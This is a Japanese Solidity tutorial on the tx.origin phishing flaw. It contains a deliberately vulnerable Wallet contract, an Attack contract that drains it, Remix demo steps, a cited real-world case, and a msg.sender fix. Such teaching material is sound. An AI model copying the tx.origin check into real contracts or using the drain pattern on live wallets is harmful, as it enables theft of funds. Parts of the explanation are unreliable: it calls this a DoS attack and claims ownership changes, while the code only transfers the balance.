# tx.originを使用した攻撃

`tx.origin` はグローバル変数で、オリジナルのトランザクションを作成したアドレスを返します。
これは `msg.sender` と似ていますが、重要な注意点があります。
`tx.origin` を正しく使用しないと、スマートコントラクトのセキュリティ脆弱性につながる可能性があることを学びます。

## tx.originとは？

`tx.origin` はグローバル変数で、トランザクションを送信した口座のアドレスを返します。
では、`msg.sender` とは何なのか、と思われるかもしれません。
- `tx.origin` はトランザクションを開始した元の外部アカウント（ユーザー）を指す。
- `msg.sender` は関数を呼び出した即時アカウントで、外部アカウントまたは関数を呼び出す他のコントラクトである可能性があることです。

したがって、たとえば、ユーザーがコントラクトAを呼び出し、それが同じトランザクション内でコントラクトBを呼び出した場合、コントラクトB内からチェックすると、`msg.sender` はコントラクトAと同じになります。
ただし、`tx.origin` はどこからチェックしてもユーザーと同じになります。

## スマートコントラクトへのDOS攻撃

`Wallet.sol` と `Attack.sol`の2つのスマートコントラクトが用意される予定です。
初期状態では、`Wallet.sol`のオーナーは User1 となる。攻撃機能`Attack.sol`を使うと、`Wallet.sol`の所有者を攻撃者に変更することができるようになる。
結果、User1 のお金が攻撃者に盗み取られてしまう。

## 実演

[Remix IDE](https://remix.ethereum.org/#optimize=false&runs=200&evmVersion=null&version=builtin)を開き、全てのディレクトリとファイルを削除します。

`Wallet.sol` というコントラクトを作成します。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Wallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function deposit() public payable {}

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");
        // require(msg.sender == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function getBalacne() public view returns (uint) {
        return address(this).balance;
    }
}
```

今度は、`Attack.sol` というコントラクトを作成し、以下のコードを記述します。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./Wallet.sol";

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
```

以下の手順で実行します。

- `Wallet.sol` を開き、ACCOUNTをデフォルトの `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4` にして、デプロイ。
- VALUEの値を `1 Ether` にし、Walletコントラクトのドロップダウン内にある `deposit` ボタンを押す。 -> `getBalance` ボタンを押し、`1000000000000000000` が表示されることを確認。
- `Attack.sol` を開き、ACCOUNTを１個下(`0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2`)に変更、`Wallet` コントラクトのアドレスをコピペしてデプロイ。
- `Wallet` コントラクト内の `transfer` ボタンのテキストボックスに、「`Attack` コントラクトのアドレス, 1000000000000000000」を入力し、ボタンを押す。 -> エラーになることを確認。
- ACCOUNTをデフォルトに戻し、`Attack` コントラクトの `attack` ボタンを押す。
- Walletコントラクトの `getBalance` ボタンを押して、数値が `0` になっていることを確認。
- ACCOUNTで `0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2` の ether残高が、１ether 増えていることを確認。

攻撃は次のように行われます。
最初は User1 が `Wallet.sol` を展開し、オーナーとなりますが、攻撃者は User1 を何らかの方法で騙して、 `Attack.sol` で攻撃関数を呼び出すようにします。

`attack` 関数はさらに `Wallet.sol` の `transfer` 関数を呼び出し、まず`tx.origin`が本当に User1 によって呼び出されたトランザクションであるため、真であるかどうかをチェックする。
所有者を確認した後、`Attack.sol` に所有者を設定する。

こうして、攻撃者は `Wallet.sol` の所有者を変更することに成功します。

## 実際の事例

`tx.origin` が使用されているのを見たことがないため、これはほとんどの人にとって当たり前のことに思えるかもしれませんが、一部の開発者はこの間違いを犯しています。
[THORChain Hack #2](https://rekt.news/thorchain-rekt2/)はこちらで読むことができます。
攻撃者がユーザーのウォレットに偽のトークンを送ることによって$RUNEトークンの承認を得ることができ、Uniswapでそのトークンを販売することを承認するとユーザーのウォレットから攻撃者のウォレットに$RUNEが転送されてしまうため、ユーザーは数百万の$RUNEを失いました。
これは THORChain が転送チェックに `msg.sender` の代わりに `tx.origin` を使っていたからです。

## 予防策

`tx.origin` の代わりに `msg.sender` を使用することで、このような事態を防ぐことができます。

```solidity
function transfer(address payable _to, uint _amount) public {
    require(msg.sender == owner, "Not owner");

    (bool sent, ) = _to.call{value: _amount}("");
    require(sent, "Failed to send Ether");
}
```